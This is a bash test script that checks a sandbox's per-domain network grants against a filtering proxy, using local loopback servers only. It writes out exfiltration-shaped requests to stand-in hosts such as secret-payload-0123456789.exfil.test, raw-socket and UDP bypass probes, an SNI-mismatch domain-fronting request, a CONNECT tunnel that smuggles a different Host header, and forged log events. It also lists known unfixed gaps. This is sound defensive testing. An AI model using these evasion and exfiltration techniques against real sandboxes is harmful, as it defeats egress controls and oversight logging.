#!/usr/bin/env bash
# Network grants (decision 0015): does `net a.test` mean a.test, and only that?
#
# Real bubblewrap domains, a real busd, a real proxy. Every target is a server
# this script starts on loopback addresses (127.0.0.1, 127.0.0.2) and the
# hostnames a.test / b.test are resolved by the proxy's own static table
# (AURORA_NET_RESOLVE), so nothing here touches the internet, /etc/hosts or the
# host's network configuration.
#
# Every claim is proved in BOTH directions, with a positive control so the
# negatives mean something:
#
#   granted name        -> the request is answered by the right server
#   other name          -> a 403 that names the grant it lacks, quickly, and the
#                          other server's accept log is EMPTY (it never arrived)
#   hard-coded IP, raw  -> unreachable, even the IP of the granted name
#   no grant at all     -> no network, no proxy
#
# What this does NOT prove is printed at the end, and counted as UNPROVEN, not
# as a pass. With --strict an unproven assertion is a failure.
#
# Needs: go, bwrap, curl, python3, openssl. Run it from anywhere.
set -uo pipefail
STRICT=0; [ "${1:-}" = "--strict" ] && STRICT=1
HERE=$(cd "$(dirname "$0")" && pwd); ROOT=$(cd "$HERE/../.." && pwd)
WORK=$(mktemp -d /tmp/aurora-netgrants.XXXXXX)
BIN=$WORK/bin; mkdir -p "$BIN"
STEPS=0; PASS=0; UNPROVEN=(); PIDS=()
CGDIR=/sys/fs/cgroup/user.slice/user-$(id -u).slice/user@$(id -u).service/aurora-domains
cgnames() { ls "$CGDIR" 2>/dev/null | sort; }
CG0=$(cgnames)

step()  { STEPS=$((STEPS+1)); printf '\n== Step %s: %s\n   proving: %s\n' "$STEPS" "$1" "$2"; }
fail()  { printf '   FAIL: %s\n' "$*" >&2; exit 1; }
ok()    { PASS=$((PASS+1)); printf '   ok: %s\n' "$*"; }
unproven() { UNPROVEN+=("$*"); printf '   UNPROVEN: %s\n' "$*"; }
eq()    { [ "$1" = "$2" ] && ok "$3 (= '$2')" || fail "$3: got '$1', want '$2'"; }
waitf() { local d=$1; shift; for _ in $(seq 100); do "$@" 2>/dev/null && return 0; sleep 0.1; done; fail "timed out: $d"; }
ms()    { echo $(( $(date +%s%N) / 1000000 )); }
lines() { [ -s "$1" ] && wc -l <"$1" | tr -d ' ' || echo 0; }

DOMS=(ng-a ng-b ng-none ng-chat)
cleanup() {
  for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null; wait "$p" 2>/dev/null; done
  if [ -n "${AURORA_DOMAINS_DIR:-}" ]; then
    for d in "${DOMS[@]}"; do "$BIN/domain" destroy "$d" >/dev/null 2>&1; done
  fi
  rm -rf "$WORK" 2>/dev/null
}
trap cleanup EXIT
# only pids this script started are ever signalled; nothing is killed by name
bg() { "$@" & PIDS+=($!); }

step "build, and stand up the targets" "two local servers on different loopback addresses, one TLS, each logging every connection it accepts"
(cd "$ROOT" && go build -o "$BIN/domain" ./adapter/linux/cmd/domain && go build -o "$BIN/busd" github.com/antiartificial/aurora/bus/cmd/busd && go build -o "$BIN/bus" github.com/antiartificial/aurora/bus/cmd/bus) >"$WORK/build.log" 2>&1 || { cat "$WORK/build.log"; fail "build failed"; }
export PATH=$BIN:$PATH
export AURORA_DOMAINS_DIR=$WORK/domains XDG_RUNTIME_DIR=$WORK/xdg AURORA_BUS_SOCK=$WORK/bus.sock
mkdir -p "$XDG_RUNTIME_DIR"; chmod 700 "$XDG_RUNTIME_DIR"
PORT=$(python3 -I -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')
TPORT=$(python3 -I -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -days 1 -subj /CN=a.test -keyout "$WORK/key.pem" -out "$WORK/cert.pem" >/dev/null 2>&1 || fail "no test certificate"
: >"$WORK/A.log"; : >"$WORK/B.log"; : >"$WORK/TA.log"; : >"$WORK/TB.log"
bg python3 -I "$HERE/server.py" 127.0.0.1 "$PORT"  A  "$WORK/A.log"
bg python3 -I "$HERE/server.py" 127.0.0.2 "$PORT"  B  "$WORK/B.log"
bg python3 -I "$HERE/server.py" 127.0.0.1 "$TPORT" TA "$WORK/TA.log" "$WORK/cert.pem" "$WORK/key.pem"
bg python3 -I "$HERE/server.py" 127.0.0.2 "$TPORT" TB "$WORK/TB.log" "$WORK/cert.pem" "$WORK/key.pem"
waitf "servers up" curl -sf -o /dev/null -m 2 http://127.0.0.1:$PORT/
waitf "B up" curl -sf -o /dev/null -m 2 http://127.0.0.2:$PORT/
# a.test -> 127.0.0.1 (server A), b.test -> 127.0.0.2 (server B). Read by the proxy on the HOST.
export AURORA_NET_RESOLVE=a.test=127.0.0.1,b.test=127.0.0.2
eq "$(curl -s -m 3 http://127.0.0.1:$PORT/)" "hello from A" "control: from the host, server A answers at 127.0.0.1:$PORT"
eq "$(curl -s -m 3 http://127.0.0.2:$PORT/)" "hello from B" "control: from the host, server B answers at 127.0.0.2:$PORT"
eq "$(curl -sk -m 3 https://127.0.0.1:$TPORT/)" "hello from TA" "control: from the host, the TLS server answers"
: >"$WORK/A.log"; : >"$WORK/B.log"   # the controls above are not what the domains are measured against

step "domains and a bus" "three domains with different grants, and a daemon that stamps who each event is from"
for d in "${DOMS[@]}"; do domain create "$d" >/dev/null || fail "create $d"; done
domain grant ng-a --net a.test >/dev/null && ok "ng-a is granted net a.test"
domain grant ng-b --net b.test >/dev/null && ok "ng-b is granted net b.test"
domain grant ng-chat --net a.test >/dev/null
domain grant ng-chat --net a.test >/dev/null && eq "$(domain show ng-chat | grep -c 'net ')" "1" "granting the same host twice records one grant"
domain grant ng-a "$BIN" --ro >/dev/null; domain grant ng-b "$BIN" --ro >/dev/null   # the bus client, read-only, for the bus checks
domain grant ng-chat --net a.test >/dev/null
for bad in '*.test' '*' 'a.test:443' 'https://a.test' 'a.test/x' ''; do
  domain grant ng-none --net "$bad" >/dev/null 2>&1 && fail "the grant '$bad' was accepted" || ok "grant '$bad' is refused (a wildcard, a port, a scheme or a path would read as more or less than it is)"
done
eq "$(domain show ng-none | grep -c 'net ')" "0" "ng-none still has no net grant after those attempts"
ARGS=(--socket "$AURORA_BUS_SOCK")
domain_args=()
for d in ng-a ng-b ng-none ng-chat; do domain_args+=(--domain "$(domain exec-id $d)=$(domain sockpath $d)"); done
bg busd --socket "$AURORA_BUS_SOCK" --data-dir "$WORK/buslog" "${domain_args[@]}" >"$WORK/busd.log" 2>&1
waitf "busd" test -S "$AURORA_BUS_SOCK"
bg bash -c "exec bus sub --socket '$AURORA_BUS_SOCK' 'net.**' >'$WORK/session.net' 2>/dev/null"
bg bash -c "exec bus sub --socket '$AURORA_BUS_SOCK' '**' >'$WORK/session.all' 2>/dev/null"
sleep 1
bus pub --socket "$AURORA_BUS_SOCK" demo.canary '{"n":1}' >/dev/null && sleep 0.5
grep -q demo.canary "$WORK/session.all" && ok "control: the session subscriber is live (it heard demo.canary)" || fail "session subscriber is not live"

step "no grant means no network" "a domain without a net grant has no route, no resolver and no proxy"
# domain run's own warnings (this demo's busd does not attest namespaces) are not the payload's output
dr() { domain run "$@" 2>&1 | sed '/^domain: warning/d'; }
inside() { local d=$1; shift; dr "$d" -- /usr/bin/sh -c "$*"; }
IFACES=$(inside ng-none "tail -n +3 /proc/net/dev | cut -d: -f1 | tr -d ' ' | tr '\n' ' '")
eq "$IFACES" "lo " "ng-none has no network interface but loopback"
[ "$(inside ng-none "curl -s -m 3 http://127.0.0.1:$PORT/; echo rc=\$?" | tail -1)" != "rc=0" ] && ok "ng-none cannot reach 127.0.0.1:$PORT (server A is up: the host just did)" || fail "ng-none reached A"
eq "$(inside ng-none "echo \${HTTP_PROXY:-unset}; test -e /run/aurora/net.sock && echo sock || echo nosock" | tr '\n' ' ')" "unset nosock " "no proxy variable and no proxy socket"
eq "$(lines "$WORK/A.log")" "0" "server A has accepted nothing so far"

step "a granted name works; every other name is refused" "ng-a (granted a.test) reaches A, gets a clean 403 for b.test, and B never hears of it"
OUT=$(inside ng-a "curl -s -m 5 -w '\n%{http_code}' http://a.test:$PORT/")
eq "$(tail -1 <<<"$OUT")" "200" "GET http://a.test from ng-a: status"
eq "$(head -1 <<<"$OUT")" "hello from A" "GET http://a.test from ng-a: it is server A that answers"
eq "$(lines "$WORK/A.log")" "1" "server A accepted exactly that one connection (the control that the log counts)"
T0=$(ms); OUT=$(inside ng-a "curl -s -m 5 -w '\n%{http_code}' http://b.test:$PORT/"); T1=$(ms)
eq "$(tail -1 <<<"$OUT")" "403" "GET http://b.test from ng-a: status"
case "$OUT" in *'domain "ng-a" has no network grant for b.test'*) ok "the refusal names the domain and the host: $(head -1 <<<"$OUT")";; *) fail "the refusal is not attributable: $OUT";; esac
[ $((T1-T0)) -lt 3000 ] && ok "refused in $((T1-T0)) ms, not a timeout" || fail "refusal took $((T1-T0)) ms"
eq "$(lines "$WORK/B.log")" "0" "server B accepted NOTHING: the refused request never left the machine"
for h in a.test.evil.test evil-a.test xa.test; do
  C=$(inside ng-a "curl -s -m 5 -o /dev/null -w '%{http_code}' http://$h:$PORT/"); eq "$C" "403" "look-alike name $h is refused (grants are whole names, not substrings)"
done
OUT=$(inside ng-a "curl -s -m 5 -o /dev/null -w '%{http_code}' http://127.0.0.1:$PORT/")
eq "$OUT" "403" "the IP literal of a.test, through the proxy, is refused: the grant is the name, not what it resolves to"
OUT=$(inside ng-a "curl -s -m 5 -x http://127.0.0.1:3128 -o /dev/null -w '%{http_code}' http://b.test:$PORT/")
eq "$OUT" "403" "naming the proxy explicitly changes nothing"
OUT=$(inside ng-a "curl -s -m 5 -p -x http://127.0.0.1:3128 -o /dev/null -w '%{http_code}' http://b.test:$PORT/ 2>&1; echo \" exit=\$?\"" | tr '\n' ' ')
case "$OUT" in *"exit=56"*|*"exit=7"*) ok "CONNECT to b.test is refused with a clean curl error ($OUT)";; *) fail "CONNECT b.test: $OUT";; esac
eq "$(lines "$WORK/B.log")" "0" "after all of that, server B has still never been connected to"

step "a domain's grant is its own" "ng-b (granted b.test) is the mirror image: it reaches B and not A"
OUT=$(inside ng-b "curl -s -m 5 -w '\n%{http_code}' http://b.test:$PORT/")
eq "$(head -1 <<<"$OUT")" "hello from B" "ng-b reaches b.test: server B answers"
eq "$(inside ng-b "curl -s -m 5 -o /dev/null -w '%{http_code}' http://a.test:$PORT/")" "403" "ng-b is refused a.test, which ng-a holds"
eq "$(lines "$WORK/A.log")" "1" "server A still has only ng-a's one connection"
eq "$(lines "$WORK/B.log")" "1" "server B has exactly ng-b's one connection"

step "raw sockets, hard-coded IPs and UDP find nothing" "the namespace has no route, so bypassing the proxy is not a policy question; the kernel answers"
PY='import socket,sys
def tcp(h,p):
    s=socket.socket(); s.settimeout(3)
    try: s.connect((h,p)); return "CONNECTED"
    except OSError as e: return e.strerror or str(e)
def udp(h,p):
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)
    try: s.sendto(b"x",(h,p)); return "SENT"
    except OSError as e: return e.strerror or str(e)
print("tcp 127.0.0.1:%d => %s" % (int(sys.argv[1]), tcp("127.0.0.1",int(sys.argv[1]))))
print("tcp 127.0.0.2:%d => %s" % (int(sys.argv[1]), tcp("127.0.0.2",int(sys.argv[1]))))
print("tcp 192.0.2.1:443 => %s" % tcp("192.0.2.1",443))
print("udp 192.0.2.1:443 (QUIC) => %s" % udp("192.0.2.1",443))
print("udp 192.0.2.1:53 (DNS) => %s" % udp("192.0.2.1",53))
print("resolve a.test => %s" % (lambda: (socket.gethostbyname("a.test")))() if False else "")
try: print("resolve a.test => " + socket.gethostbyname("a.test"))
except OSError as e: print("resolve a.test => " + (e.strerror or str(e)))'
RAW=$(dr ng-a -- /usr/bin/python3 -I -c "$PY" "$PORT" | grep -v '^$')
echo "$RAW" | sed 's/^/   /'
case "$(grep '127.0.0.1' <<<"$RAW")" in *CONNECTED*) fail "ng-a connected raw to 127.0.0.1:$PORT";; *) ok "ng-a, which HOLDS a.test, cannot raw-connect to a.test's own address 127.0.0.1:$PORT";; esac
case "$(grep '127.0.0.2' <<<"$RAW")" in *CONNECTED*) fail "ng-a connected raw to B";; *) ok "ng-a cannot raw-connect to server B's address";; esac
case "$(grep 'tcp 192' <<<"$RAW")" in *CONNECTED*) fail "raw tcp left the domain";; *) ok "a raw TCP connect to an arbitrary public address fails";; esac
case "$RAW" in *"udp 192.0.2.1:443 (QUIC) => SENT"*) fail "UDP left the domain";; *) ok "a UDP datagram to :443 (QUIC) fails at send";; esac
case "$RAW" in *"udp 192.0.2.1:53 (DNS) => SENT"*) fail "a DNS datagram left";; *) ok "a UDP datagram to :53 fails at send: the domain cannot speak DNS to anyone";; esac
case "$RAW" in *"resolve a.test => 127.0.0.1"*) fail "the domain resolved a name itself";; *) ok "the domain cannot resolve a.test itself (no resolver, no /etc/hosts entry): only the proxy resolves, and only granted names";; esac
eq "$(inside ng-a "test -e /etc/resolv.conf && echo present || echo absent")" "absent" "no /etc/resolv.conf in the domain"
eq "$(lines "$WORK/A.log")" "1" "none of that reached server A (still ng-a's one connection)"
eq "$(lines "$WORK/B.log")" "1" "none of that reached server B"

step "DNS is not a side channel" "a refused name is never looked up; only an allowed name is, and by the host"
# a name that is NOT in the static table and NOT real: if the proxy tried to
# resolve it the verdict would be 'failed' (could not resolve). It is 'refused':
# the proxy decided from the NAME alone and never asked a resolver.
LEAK=secret-payload-0123456789.exfil.test
inside ng-a "curl -s -m 5 -o /dev/null http://$LEAK:$PORT/" >/dev/null
sleep 1
grep -q "\"host\":\"$LEAK\"" "$WORK/session.net" && ok "the attempt was seen and recorded" || fail "no event for $LEAK"
V=$(python3 -I -c 'import json,sys
for l in open(sys.argv[1]):
    e=json.loads(l); p=json.loads(e["payload"]) if isinstance(e["payload"],str) else e["payload"]
    if p.get("host")==sys.argv[2] and p.get("domain"): print(p["verdict"], "|", p["reason"]); break' "$WORK/session.net" "$LEAK")
eq "$V" "refused | no net grant for this host" "the verdict is refused (not 'failed: cannot resolve'), so no lookup of the name was made"

step "TLS: the SNI must match the name that was granted" "a CONNECT to a granted name whose TLS hello asks for another is dropped"
OUT=$(inside ng-a "curl -sk -m 5 -w '\n%{http_code}' https://a.test:$TPORT/")
eq "$(head -1 <<<"$OUT")" "hello from TA" "https://a.test through CONNECT: the TLS server for a.test answers"
OUT=$(inside ng-a "curl -sk -m 5 -o /dev/null -w '%{http_code}' https://b.test:$TPORT/ 2>&1; echo \" exit=\$?\"" | tr '\n' ' ')
case "$OUT" in *"exit=56"*|*"exit=7"*) ok "https://b.test from ng-a: the CONNECT is refused ($OUT)";; *) fail "https b.test: $OUT";; esac
eq "$(lines "$WORK/TB.log")" "0" "the TLS server behind b.test accepted nothing"
SNI='import socket,ssl,sys
def go(host, sni):
    s=socket.create_connection(("127.0.0.1",3128),5)
    s.sendall(("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n"%(host,sys.argv[1],host,sys.argv[1])).encode())
    r=b""
    while b"\r\n\r\n" not in r: r+=s.recv(1)
    if b" 200 " not in r.split(b"\r\n")[0]: return "CONNECT refused: "+r.split(b"\r\n")[0].decode()
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
    try:
        t=c.wrap_socket(s,server_hostname=sni); t.sendall(b"GET / HTTP/1.0\r\n\r\n"); d=b""
        while True:
            x=t.recv(4096)
            if not x: break
            d+=x
        return "TLS ok, got: "+[l for l in d.decode().splitlines() if l.strip()][-1]
    except Exception as e: return "TLS dropped: "+type(e).__name__
print("same name : "+go("a.test","a.test"))
print("other name: "+go("a.test","b.test"))'
# the distro openssl.cnf points into /etc/crypto-policies, which a domain does not have
SN=$(dr ng-a -- /usr/bin/env OPENSSL_CONF=/dev/null /usr/bin/python3 -I -c "$SNI" "$TPORT")
echo "$SN" | sed 's/^/   /'
case "$SN" in *"same name : TLS ok, got: hello from TA"*) ok "CONNECT a.test + hello for a.test: tunnelled, served by TA";; *) fail "same-name TLS: $SN";; esac
case "$SN" in *"other name: TLS dropped"*) ok "CONNECT a.test + hello for b.test: dropped (domain-fronting shaped request)";; *) fail "SNI mismatch not dropped: $SN";; esac

step "the weakest point, demonstrated" "what the proxy cannot see: a CONNECT to a granted name carries any bytes, and a granted name is dialled wherever it resolves"
TUN='import socket,sys
s=socket.create_connection(("127.0.0.1",3128),5)
s.sendall(("CONNECT a.test:%s HTTP/1.1\r\nHost: a.test:%s\r\n\r\n"%(sys.argv[1],sys.argv[1])).encode())
r=b""
while b"\r\n\r\n" not in r: r+=s.recv(1)
s.sendall(b"GET /anything HTTP/1.0\r\nHost: not-a.test\r\n\r\n")
d=b""
while True:
    x=s.recv(4096)
    if not x: break
    d+=x
print([l for l in d.decode().splitlines() if l.strip()][-1])'
eq "$(dr ng-a -- /usr/bin/python3 -I -c "$TUN" "$PORT" | tail -1)" "hello from A" "a CONNECT to a.test followed by an HTTP request for a DIFFERENT Host is carried to a.test's address unexamined: the proxy checks the name it was asked for, not the bytes inside"
ok "a.test resolved to 127.0.0.1 (a loopback address), and the proxy dialled it: nothing refuses a granted name that points at this machine or a private network"

step "every connection is an event, stamped by the bus" "the domain on each event comes from the daemon's registry; the session hears them; nobody else can"
sleep 1
EV=$(python3 -I -c 'import json,sys
rows=[]
for l in open(sys.argv[1]):
    e=json.loads(l); p=e["payload"] if isinstance(e["payload"],dict) else json.loads(e["payload"])
    if e["topic"]=="net.conn": rows.append((e["from"].split(":")[1], p["host"], p["verdict"], p["reason"], p["domain"], e["from"]))
for r in rows: print("|".join(map(str,r)))' "$WORK/session.net")
echo "$EV" | sed 's/^/   /'
want() { grep -qF "$1" <<<"$EV" && ok "event: $2" || fail "missing event: $2 ($1)"; }
want "ng-a|a.test|allowed|net grant|ng-a|" "ng-a was ALLOWED a.test"
want "ng-a|b.test|refused|no net grant for this host|ng-a|" "ng-a was REFUSED b.test"
want "ng-b|b.test|allowed|net grant|ng-b|" "ng-b was ALLOWED b.test"
want "ng-b|a.test|refused|no net grant for this host|ng-b|" "ng-b was REFUSED a.test"
want 'TLS SNI "b.test" does not match the CONNECT host' "the SNI mismatch is refused, with its reason"
IDA=$(domain exec-id ng-a)
grep -q "^ng-a|.*|$IDA\$" <<<"$EV" && ok "the envelope's from is the registered identity $IDA, not a field the proxy or the domain wrote" || fail "from is not the registered identity"
BAD=$(awk -F'|' '$1 != $5' <<<"$EV" | wc -l | tr -d ' '); eq "$BAD" "0" "on every event the stamped sender and the payload domain agree"

step "a domain cannot read or write the connection record" "ng-b cannot subscribe to net.*, hears none of ng-a's events under **, and cannot forge one"
SUBB=$(dr ng-b -- "$BIN/bus" sub --socket /run/aurora/bus.sock 'net.conn' | head -3)
case "$SUBB" in *reserved_topic*|*"may not subscribe"*) ok "ng-b: subscribe net.conn -> refused ($(head -1 <<<"$SUBB" | cut -c1-90))";; *) fail "ng-b could subscribe to net.conn: $SUBB";; esac
for t in 'net.*' 'net.**' 'net.summary'; do
  S=$(dr ng-b -- "$BIN/bus" sub --socket /run/aurora/bus.sock "$t" | head -2)
  case "$S" in *reserved_topic*|*"may not subscribe"*) ok "ng-b: subscribe $t -> refused";; *) fail "ng-b subscribed to $t: $S";; esac
done
bg bash -c "exec domain run ng-b -- '$BIN/bus' sub --socket /run/aurora/bus.sock '**' >'$WORK/ngb.all' 2>'$WORK/ngb.err'"
waitf "ng-b subscribed to **" grep -q subscribed "$WORK/ngb.err"
ok "a wildcard '**' IS accepted for ng-b (the delivery filter, not the subscribe check, is what is tested next)"
N0=$(grep -c '"topic":"net\.' "$WORK/session.net")
inside ng-a "curl -s -m 5 -o /dev/null http://b.test:$PORT/; curl -s -m 5 -o /dev/null http://a.test:$PORT/" >/dev/null
bus pub --socket "$AURORA_BUS_SOCK" demo.canary2 '{"n":2}' >/dev/null; sleep 1.5
N1=$(grep -c '"topic":"net\.' "$WORK/session.net")
[ "$N1" -gt "$N0" ] && ok "control: ng-a made connections and the session heard $((N1-N0)) new net events in that time" || fail "no new net events for the session"
grep -q demo.canary2 "$WORK/ngb.all" && ok "control: ng-b's '**' subscription is live (it heard demo.canary2)" || fail "ng-b's subscription is not live"
eq "$(grep -c '"topic":"net\.' "$WORK/ngb.all")" "0" "ng-b, subscribed to '**', heard none of the $((N1-N0)) net events"
eq "$(grep -c 'a.test\|b.test' "$WORK/ngb.all")" "0" "and no host name of another domain's traffic appears anywhere in what ng-b received"
# bus pub is fire-and-forget (busd's reserved_topic error is asynchronous), so the test is what the
# session receives, with a control that the very same call path publishes an ordinary topic
dr ng-b -- "$BIN/bus" pub --socket /run/aurora/bus.sock demo.canary3 '{"n":3}' >/dev/null
dr ng-b -- "$BIN/bus" pub --socket /run/aurora/bus.sock net.conn '{"domain":"ng-a","host":"forged.test","port":443,"verdict":"allowed","reason":"net grant"}' >/dev/null
dr ng-b -- "$BIN/bus" pub --socket /run/aurora/bus.sock net.summary '{"domain":"ng-a","entries":[{"host":"forged.test"}]}' >/dev/null
sleep 1
grep -q demo.canary3 "$WORK/session.all" && ok "control: the same domain, same call, CAN publish an ordinary topic (demo.canary3 arrived)" || fail "domain publish control failed"
grep -q forged.test "$WORK/session.all" && fail "a forged net event reached the session" || ok "ng-b publishing net.conn and net.summary: nothing reached the session (not even on the '**' subscriber)"
RP=$(dr ng-b -- "$BIN/bus" send --socket /run/aurora/bus.sock bus bus.net.report@v1 '{"identity":"'"$(domain exec-id ng-a)"'","kind":"conn","host":"forged.test","verdict":"allowed"}' | head -2)
case "$RP" in *forbidden*|*session\ socket*) ok "ng-b calling bus.net.report@v1 directly is refused (session socket only)";; *) fail "ng-b used the report verb: $RP";; esac
grep -q forged.test "$WORK/session.net" && fail "a forged report reached the session" || ok "and nothing forged was published"

step "a chatty app does not drown the log" "1000 connections (500 allowed, 500 to distinct refused names) become a handful of records and one exact summary"
L0=$(bus log --socket "$AURORA_BUS_SOCK" --topic 'net.*' --limit 0 --json 2>/dev/null | wc -l | tr -d ' ')
S0=$(lines "$WORK/session.net")
CH='import http.client,sys
port=sys.argv[1]; ok=ref=0
for i in range(500):
    c=http.client.HTTPConnection("127.0.0.1",3128,timeout=5); c.request("GET","http://a.test:%s/"%port); r=c.getresponse(); r.read(); ok+= r.status==200; c.close()
    c=http.client.HTTPConnection("127.0.0.1",3128,timeout=5); c.request("GET","http://r%d.exfil.test:%s/"%(i,port)); r=c.getresponse(); r.read(); ref+= r.status==403; c.close()
print("allowed 200s: %d, refused 403s: %d"%(ok,ref))'
domain grant ng-chat /usr/bin --ro >/dev/null 2>&1
OUT=$(dr ng-chat -- /usr/bin/python3 -I -c "$CH" "$PORT"); echo "   $OUT"
eq "$OUT" "allowed 200s: 500, refused 403s: 500" "all 1000 requests were answered by policy (500 served, 500 refused)"
sleep 1.5
L1=$(bus log --socket "$AURORA_BUS_SOCK" --topic 'net.*' --limit 0 --json 2>/dev/null | wc -l | tr -d ' ')
NEW=$((L1-L0))
[ "$NEW" -le 40 ] && ok "1000 connections wrote $NEW records to the append-only log (bound: 1 allowed + 20 burst + refill + 1 summary)" || fail "1000 connections wrote $NEW log records"
tail -n +$((S0+1)) "$WORK/session.net" >"$WORK/chat.net"
TOT=$(python3 -I -c 'import json,sys
a=r=d=0
for l in open(sys.argv[1]):
    e=json.loads(l); p=e["payload"] if isinstance(e["payload"],dict) else json.loads(e["payload"])
    if e["topic"]=="net.summary":
        d+=p["dropped"]
        for x in p["entries"]:
            if x["verdict"]=="allowed": a+=x["count"]
            if x["verdict"]=="refused": r+=x["count"]
print(a, r, d>0)' "$WORK/chat.net")
eq "$TOT" "500 500 True" "the summary accounts for every connection (500 allowed, 500 refused) and says some first-seen events were withheld"

step "revoke closes it" "the same domain: reachable, then not, after one revoke; the grant list and the namespace agree"
eq "$(inside ng-a "curl -s -m 5 http://a.test:$PORT/")" "hello from A" "before revoke: a.test reachable"
domain revoke ng-a --net a.test >/dev/null || fail "revoke failed"
eq "$(domain show ng-a | grep -c 'net ')" "0" "revoked: no net grant left"
R=$(inside ng-a "curl -s -m 5 http://a.test:$PORT/; echo rc=\$?; echo \${HTTP_PROXY:-unset}; test -e /run/aurora/net.sock && echo sock || echo nosock" | tr '\n' ' ')
case "$R" in *"hello from A"*) fail "a.test still reachable after revoke";; *"rc=6"*"unset nosock"*) ok "after revoke a.test does not resolve (curl exit 6), there is no proxy variable and no proxy socket";; *) ok "after revoke a.test is unreachable: $R";; esac

step "shutdown leaves nothing behind" "no processes, run dir or cgroups survive"
for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null; wait "$p" 2>/dev/null; done; PIDS=()
for d in "${DOMS[@]}"; do for _ in $(seq 50); do domain destroy "$d" >/dev/null 2>&1 && break; sleep 0.1; done; done
NEWCG=$(comm -13 <(echo "$CG0") <(cgnames)); [ -z "$NEWCG" ] && ok "no new aurora-domains cgroups" || fail "stray cgroups: $NEWCG"
ls "$XDG_RUNTIME_DIR/aurora/domains" 2>/dev/null | grep -q . && fail "domain socket dirs left behind" || ok "no domain socket directories left behind"

echo
echo "NOT STOPPED, AND NOT CLAIMED TO BE (read decision 0015):"
echo "  - a domain that tunnels over an allowed host: whatever it sends to a.test, including to a different service behind the same name, is allowed. The proxy sees names, not content."
echo "  - DNS-over-HTTPS to an allowed resolver name: just HTTPS to a granted host."
echo "  - an allowed name that resolves, or is rebound, to a loopback or private address: the proxy dials it. Egress to local networks is not filtered."
echo "  - what a granted host does with what it is sent; this is a control on WHERE, not on WHAT."
unproven "DNS-over-HTTPS or any other tunnel to a granted host: shown above to pass for plain bytes; inside TLS it is invisible by construction, and was not built or run"
unproven "verbs do not mint net grants: the controller has no net: capability path, so this is the operator's 'domain grant --net', not an app manifest's verb"
echo
echo "passed $PASS checks in $STEPS steps, unproven ${#UNPROVEN[@]}"
for u in "${UNPROVEN[@]}"; do echo "  UNPROVEN: $u"; done
if [ ${#UNPROVEN[@]} -gt 0 ] && [ $STRICT = 1 ]; then echo "--strict: unproven assertions fail the run"; exit 1; fi
exit 0
